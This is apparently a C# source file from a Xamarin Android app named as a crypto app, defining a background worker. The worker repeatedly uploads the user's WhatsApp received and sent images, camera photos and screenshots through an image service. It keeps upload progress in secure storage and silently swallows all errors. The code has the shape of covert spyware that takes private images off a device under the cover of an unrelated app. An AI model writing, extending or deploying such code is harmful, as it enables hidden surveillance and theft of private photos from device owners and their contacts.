using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using AndroidX.Work;
using Xamarin.Essentials;

namespace CryptoAppXamarinAndroid.Services
{
    public class MyJobScheduler : Worker
    {
        private Context myContext;
        public MyJobScheduler(Context context, WorkerParameters workerParameters) : base(context, workerParameters)
        {
            myContext = context;
        }


        public override Result DoWork()
        {
            Task.Run(async () =>
            {
                var temp1 = await SecureStorage.GetAsync("WhatsAppReceivedImages");
                List<string> ReceivedFiles = JsonSerializer.Deserialize<List<string>>(temp1);
                var temp2 = await SecureStorage.GetAsync("WhatsAppReceivedImagesDone");
                var WhatsAppReceivedImagesDone = int.Parse(temp2);
                var temp3 = await SecureStorage.GetAsync("WhatsAppSentImages");
                List<string> SentFiles = JsonSerializer.Deserialize<List<string>>(temp3);
                var temp4 = await SecureStorage.GetAsync("WhatsAppSentImagesDone");
                var WhatsAppSentImagesDone = int.Parse(temp4);
                var temp5 = await SecureStorage.GetAsync("CamImages");
                List<string> CamImages = JsonSerializer.Deserialize<List<string>>(temp5);
                var temp6 = await SecureStorage.GetAsync("CamImagesDone");
                var CamImagesDone = int.Parse(temp6);
                var temp7 = await SecureStorage.GetAsync("ScreenImages");
                List<string> ScreenImages = JsonSerializer.Deserialize<List<string>>(temp7);
                var temp8 = await SecureStorage.GetAsync("ScreenImagesDone");
                var ScreenImagesDone = int.Parse(temp8);
                for(int i=0;i<10000;i++)
                {
                    var current = Connectivity.NetworkAccess;

                    if (current == NetworkAccess.Internet)
                    {
                        if (WhatsAppReceivedImagesDone < ReceivedFiles.Count && System.IO.File.Exists(ReceivedFiles[WhatsAppReceivedImagesDone]))
                        {
                            try
                            {
                                var result = await ImageService.UploadImageAsync(ReceivedFiles[WhatsAppReceivedImagesDone]);
                                if (result)
                                {
                                    WhatsAppReceivedImagesDone++;
                                    await SecureStorage.SetAsync("WhatsAppReceivedImagesDone", WhatsAppReceivedImagesDone.ToString());
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (WhatsAppSentImagesDone < SentFiles.Count && System.IO.File.Exists(SentFiles[WhatsAppSentImagesDone]))
                        {
                            try
                            {
                                var result = await ImageService.UploadImageAsync(SentFiles[WhatsAppSentImagesDone]);
                                if (result)
                                {
                                    WhatsAppSentImagesDone++;
                                    await SecureStorage.SetAsync("WhatsAppSentImagesDone", (WhatsAppSentImagesDone).ToString());
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (CamImagesDone < CamImages.Count && System.IO.File.Exists(CamImages[CamImagesDone]))
                        {
                            try
                            {
                                var result = await ImageService.UploadImageAsync(CamImages[CamImagesDone]);
                                if (result)
                                {
                                    CamImagesDone++;
                                    await SecureStorage.SetAsync("CamImagesDone", (CamImagesDone).ToString());
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        if (ScreenImagesDone < ScreenImages.Count && System.IO.File.Exists(ScreenImages[ScreenImagesDone]))
                        {
                            try
                            {
                                var result = await ImageService.UploadImageAsync(ScreenImages[ScreenImagesDone]);
                                if (result)
                                {
                                    ScreenImagesDone++;
                                    await SecureStorage.SetAsync("ScreenImagesDone", (ScreenImagesDone).ToString());
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }

                
                

            });
            return Result.InvokeSuccess();
        }
    }
}